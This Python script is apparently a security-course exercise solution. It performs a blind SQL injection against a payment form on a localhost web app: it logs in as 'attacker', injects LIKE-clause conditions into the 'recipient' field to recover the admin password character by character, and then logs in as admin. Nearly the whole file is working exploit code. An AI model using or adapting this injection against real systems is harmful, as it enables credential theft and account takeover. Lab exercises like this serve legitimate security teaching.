from requests import codes, Session

LOGIN_FORM_URL = "http://localhost:8080/login"
PAY_FORM_URL = "http://localhost:8080/pay"

def submit_login_form(sess, username, password):
    response = sess.post(LOGIN_FORM_URL,
                         data={
                             "username": username,
                             "password": password,
                             "login": "Login",
                         })
    return response.status_code == codes.ok

def submit_pay_form(sess, recipient, amount):
    # You may need to include CSRF token from Exercise 1.5 in the POST request below 
    response = sess.post(PAY_FORM_URL,
                    data={
                        "recipient": recipient,
                        "amount": amount,
                        "_csrf": sess.cookies.get_dict()["session"]
                    })
    return response.status_code == codes.ok

def sqli_attack(username):
    sess = Session()
    assert(submit_login_form(sess, "attacker", "attacker"))
    password = ""
    found = False
    while not found:  # attacker' AND users.password like 'c%
        for c in "abcdefghijklmnopqrstuvwxyz":
            if password and submit_pay_form(sess, f"{username}' AND users.password='{password}", 1):
                found = True
                break
            if submit_pay_form(sess, f"{username}' AND users.password like '{password + c}%", 1):
                password += c
                print(password)
    
    assert(submit_login_form(sess, username, password))
    print(username, password)
    return password

def main():
    sqli_attack("admin")

if __name__ == "__main__":
    main()
